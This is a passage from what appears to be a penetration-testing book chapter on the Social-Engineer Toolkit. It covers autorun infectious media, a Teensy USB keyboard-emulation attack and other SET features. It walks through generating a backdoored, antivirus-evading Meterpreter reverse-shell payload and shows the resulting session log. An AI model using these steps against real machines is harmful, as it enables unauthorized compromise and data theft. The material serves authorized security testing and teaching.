[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</pre><p class="calibre2">As you’ve seen in the preceding examples, you can see that SET offers a number of powerful web-based attack vectors in its arsenal. It can be difficult to persuade a target to think that a cloned site is legitimate. Most knowledgeable users are generally cautious about unfamiliar sites and try to avoid potential security issues as they browse the Internet. SET tries to leverage this cautiousness and, by letting you mimic a known website, fool even some of the savviest technical folks.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="infectious_media_generator">Infectious Media Generator</h2></div></div></div><p class="calibre2">The Infectious Media Generator is a relatively simple attack vector. With this vector, SET creates a folder for you that you can either burn to a CD/DVD or store on a USB thumb drive. The <span class="strong"><em class="calibre4">autorun.inf</em></span> file is used, which, once inserted into a target’s machine, will execute whatever you specify during attack creation. Currently, SET supports executables (such as Meterpreter) as well as file-format bugs (such as Adobe exploits).<a id="IDX-CHP-10-0109" class="strong"/><a id="IDX-CHP-10-0110" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="teensy_usb_hid_attack_vector">Teensy USB HID Attack Vector</h2></div></div></div><p class="calibre2">The Teensy USB HID (human interface device) attack vector is a remarkable combination of customized hardware and restriction bypass via keyboard emulation. Traditionally, when you insert a CD/DVD or USB into your computer, if autorun is disabled, <span class="strong"><em class="calibre4">autorun.inf</em></span> isn’t called and you can’t execute your code automatically. However, using the Teensy USB HID, you can emulate a keyboard and mouse. When you insert the device, it will be detected as a keyboard, and using the microprocessor and onboard flash memory storage, you can send a very fast set of keystrokes to the target’s machine and completely compromise it, regardless of autorun. You can order a Teensy USB HID at <a class="xref" href="http://www.prjc.com/" target="_top">http://www.prjc.com/</a>.</p><p class="calibre2">Let’s set up a Teensy USB HID to perform a WScript download of a Metasploit payload. In the following example, a small WScript file will be written that will download an executable and execute it. This will be our Metasploit payload, and it’s all handled through SET.<a id="IDX-CHP-10-0111" class="strong"/></p><a id="I_programlisting10_d1e12879" class="strong"/><pre class="programlisting">Select from the menu:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 6.  Teensy USB HID Attack Vector

  Enter your choice: <strong class="calibre3"><code class="calibre6">6</code></strong>

  Welcome to the Teensy HID Attack Vector.

  Special thanks to: IronGeek and WinFang

  1. Powershell HTTP GET MSF Payload
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. WSCRIPT HTTP GET MSF Payload
  3. Powershell based Reverse Shell
  4. Return to the main menu.

  Enter your choice: <strong class="calibre3"><code class="calibre6">2</code></strong>
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Do you want to create a payload and listener yes or no: <strong class="calibre3"><code class="calibre6">yes</code></strong>
  What payload do you want to generate:

  Name:                                      Description:

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter
 shell on victim and send
                                                 back to attacker.

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter choice (hit enter for default):

  Below is a list of encodings to try and bypass AV.

  Select one of the below, 'backdoored executable' is typically the best.

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  16. Backdoored Executable (BEST)

<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> Enter your choice (enter for default):
  [-] Enter the PORT of the listener (enter for default):

  [-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
  [-] Backdoor completed successfully. Payload is now hidden within a legit executable

  [*] PDE file created. You can get it under 'reports/teensy.pde'
  [*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino
  Press enter to continue.

  [*] Launching MSF Listener...
  resource (src/program_junk/meta_config)&gt; <strong class="calibre3"><code class="calibre6">exploit -j</code></strong>
  [*] Exploit running as background job.
  msf exploit(handler) &gt;
  [*] Started reverse handler on 0.0.0.0:443
  [*] Starting the payload handler...</pre><p class="calibre2">To begin setting up this attack, choose <code class="literal">Teensy USB HID Attack Vector</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12935" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> from the main menu, and then choose <code class="literal">WSCRIPT HTTP GET MSF Payload</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12944" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Then tell SET to set up a payload and listener <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12950" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, selecting the default Meterpreter payload <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12957" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and encoding method <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12963" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>.<a id="IDX-CHP-10-0112" class="strong"/></p><p class="calibre2">Now that you have a <span class="strong"><em class="calibre4">.pde</em></span> file, you will need to download and use the Arduino interface, which is a graphical user interface for compiling the <span class="strong"><em class="calibre4">.pde</em></span> files to be uploaded to your Teensy device.<a id="IDX-CHP-10-0113" class="strong"/><a id="IDX-CHP-10-0114" class="strong"/></p><p class="calibre2">For this attack, follow the instructions at PJRC (<a class="xref" href="http://www.pjrc.com/" target="_top">http://www.pjrc.com/</a>) for uploading your code to the Teensy board. It’s relatively simple. You install the Teensy loader and libraries. Then you’ll see an IDE (Integrated Drive Electronics) interface called <span class="strong"><em class="calibre4">Arduino</em></span>. (Arduino/Teensy is supported on Linux, Mac OS X, and Windows operating systems.) One of the <span class="strong"><em class="calibre4">most</em></span> important aspects of this is that you ensure that you set your board to a Teensy USB keyboard/mouse, as show in <a class="xref" href="part0014.html#setting_up_the_teensy_device">Figure 10-7</a>.</p><div class="figure"><a id="setting_up_the_teensy_device" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e13001" class="strong"/><img src="../images/00045.jpeg" alt="Setting up the Teensy device" hisrc="httpatomoreillycomsourcenostarchimages867544.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-7. Setting up the Teensy device</div></div><p class="calibre2">After you have this selected, drag your <span class="strong"><em class="calibre4">.pde</em></span> file into the Arduino interface. Insert your USB device into the computer and upload your code. This will program your device with the SET-generated code. <a class="xref" href="part0014.html#teensy_attack_code_upload">Figure 10-8</a> shows the code being uploaded.</p><p class="calibre2">After the programmed USB device is inserted into the target’s machine and the code is installed, you should see a Meterpreter shell:</p><a id="I_programlisting10_d1e13015" class="strong"/><pre class="programlisting">[*] Sending stage (748544 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at
     Thu June 09 12:52:32 −0400 2010
[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing
     InitialAutoRunScript 'migrate -f'
[*] Current server process: java.exe (824)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3044
[*] New server process: notepad.exe (3044)</pre><div class="figure"><a id="teensy_attack_code_upload" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e13021" class="strong"/><img src="../images/00046.jpeg" alt="Teensy attack code upload" hisrc="httpatomoreillycomsourcenostarchimages867546.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-8. Teensy attack code upload</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="additional_set_features">Additional SET Features</h2></div></div></div><p class="calibre2">We won’t cover every aspect of the Social-Engineer Toolkit, but it does have some particularly notable aspects. One tool of note is the SET Interactive Shell: an interactive shell that can be selected as a payload instead of Meterpreter. Another feature is RATTE (Remote Administration Tool Tommy Edition), a full HTTP tunneling payload that was created by Thomas Werth. It relies on HTTP-based communications and piggybacks proxy settings on the target machine. RATTE is particularly useful when the target uses egress and packet inspection rules that can detect non-HTTP traffic. RATTE uses the Blowfish encryption algorithm for communications to allow full encryption over HTTP.<a id="IDX-CHP-10-0115" class="strong"/><a id="IDX-CHP-10-0116" class="strong"/><a id="IDX-CHP-10-0117" class="strong"/><a id="IDX-CHP-10-0118" class="strong"/><a id="IDX-CHP-10-0119" class="strong"/><a id="IDX-CHP-10-0120" class="strong"/></p><p class="calibre2">Two other tools include the SET Web-GUI (a full-fledged web application that automates several of the attacks discussed above) and the wireless attack vector. To run the SET Web-GUI, simply enter <strong class="calibre3"><code class="calibre6">./set-web</code></strong> from the SET home folder. The Web-GUI is written in Python and is a great way to perform attacks through a web interface. The wireless attack vector creates a rogue access point on the attacking machine. When the target connects to the access point, any website he visits is redirected to the attacker machine, which can then launch a number of SET attacks (such as harvester or the Java applet) on the target.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="looking_ahead-id1">Looking Ahead</h2></div></div></div><p class="calibre2">Like Metasploit, SET is a work in progress. The security community has embraced the capabilities and potential of SET and continues to contribute to making it better. Social-engineering attacks are on the rise, so ensuring that you can properly test these attack vectors is imperative for any comprehensive security program.</p><p class="calibre2">As organizations and vendors get better at securing their network perimeters with software and hardware solutions, we often forget how easy it is to call or email a user and convince him to click or download something that can be used for an attack. Social engineering in general takes skill and practice, and a good attacker knows that he needs to ensure that the attack is specially crafted to target weaknesses in his targets’ company user awareness programs or systems. A skilled attacker knows that spending a few days researching an organization, looking at Facebook or Twitter pages, and determining what may trigger someone to click hastily is just as important as the tools used behind the attack.</p><p class="calibre2">Tools like SET are useful to attackers, but always remember that as a penetration tester, your skill is defined by your creativity and your ability to navigate difficult situations. SET will aid you in attacking your targets, but, ultimately, if you fail, it’s probably because you weren’t creative enough.</p></div></section></body></html>